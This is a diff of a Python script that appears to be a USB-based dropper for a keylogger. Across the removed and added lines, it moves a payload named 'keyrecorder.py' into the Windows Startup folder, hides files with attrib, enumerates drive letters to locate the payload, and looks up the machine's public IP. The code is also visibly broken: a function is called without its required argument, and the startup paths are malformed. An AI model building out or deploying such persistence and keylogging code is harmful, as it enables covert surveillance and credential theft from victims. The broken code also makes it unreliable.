@@ -1,40 +1,5 @@
 import os
-import time
-import subprocess
-import socket
 import shutil
-import string
-from requests import get 
-
-
-# Getting the username of logged in account
-user = os.getlogin()
-
-startup_path = "C:\\Users\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-
-
-# Moving files from usb to shell:startup
-def add_to_startup(file):
-    shutil.move(f"{file}" , "C:\Users\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
-    print("[*] Successfully moved files")
-
-
-def file_hider(file):
-   # Hides a specific python file inside specified folder 
-    subprocess.run(["attrib", "+H", f"{file}"])
-    print("[*] Successfully hid file")
-
-# Printing ip address
-def printIPs():    
-    print("[*] Printing IP Addresses")
-    start_time = time.time()
-    local_ip = socket.gethostbyname(socket.gethostname())
-    public_ip = get('https://api.ipify.org').content.decode('utf8')
-    print(f"Local IP: {local_ip}\n")
-    print(f"Public IP: {public_ip}")
-    print("--- %s s ---" % round(time.time() - start_time, 2))
-
-
 
 # Printing art
 print(r"""
@@ -73,44 +38,14 @@ print(r"""
 -----------------------------------------------------
                    
 """)
+# Getting the username of logged in account
+user = os.getlogin()
 
-printIPs()
+# Moving files from usb to shell:startup
+def add_to_startup(file):
+    shutil.move(f"{file}", "C:\\Users\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+    print("[*] Successfully moved files")
 
-while True:
-  start = input(" Do you want to start program? y/n: ")
-  if start == "y":
-      run = True
-      break
-  elif start == "n":
-      run = False
-      break
-  else:
-      print("Please input something valid")
+payload = "keyrecorder.py"
+# add_to_startup(payload)
 
-# Finding out what letter the usb is and the payload inside it
-for char in string.ascii_uppercase:
-    if os.path.exists(f"{char}:\\"):
-        print(f"Found {char}:\\")
-
-def directory_explorer(path):
-    drive_paths = []
-    for char in string.ascii_uppercase:
-        if os.path.exists(f"{char}:\\"):
-            drive_paths.append(char)
-        for letter in drive_paths:
-            if os.path.exists(f"{letter}:\\{path}"):
-                return 
-file = directory_explorer()    
-while run:
-    print("Starting program...")
-    add_to_startup(file="")
-    file_hider(file=file)
-
-
-def addStartup(file):
-    # Checks if it's already in startup. If not adds it
-    if os.path.exists("C:\\Users\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\") == True:
-        pass
-    else:    
-        shutil.move(f"{file}" , "C:\\Users\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-    
